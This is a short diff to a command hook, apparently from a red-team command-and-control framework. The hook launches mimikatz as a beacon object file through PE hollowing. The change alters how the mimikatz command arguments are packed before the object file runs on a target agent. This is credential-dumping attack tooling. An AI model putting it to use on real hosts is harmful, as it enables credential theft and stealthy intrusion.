@@ -40,17 +40,13 @@ cmd_bofkatz.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
     }
     if (commands.length === 0) commands.push("coffee");
 
-    var mimiArgs = "";
+    var fmt = "";
     for (var j = 0; j < commands.length; j++) {
-        if (j > 0) mimiArgs += " ";
-        if (commands[j].indexOf(' ') !== -1) {
-            mimiArgs += '"' + commands[j] + '"';
-        } else {
-            mimiArgs += commands[j];
-        }
+        if (j > 0) fmt += ",";
+        fmt += "cstr";
     }
 
-    var bof_params = ax.bof_pack("cstr", [mimiArgs]);
+    var bof_params = ax.bof_pack(fmt, commands);
     var bof_path = ax.script_dir() + "BOFKatz." + ax.arch(id) + ".o";
     ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, "BOFKatz: mimikatz via PE hollowing");
 });
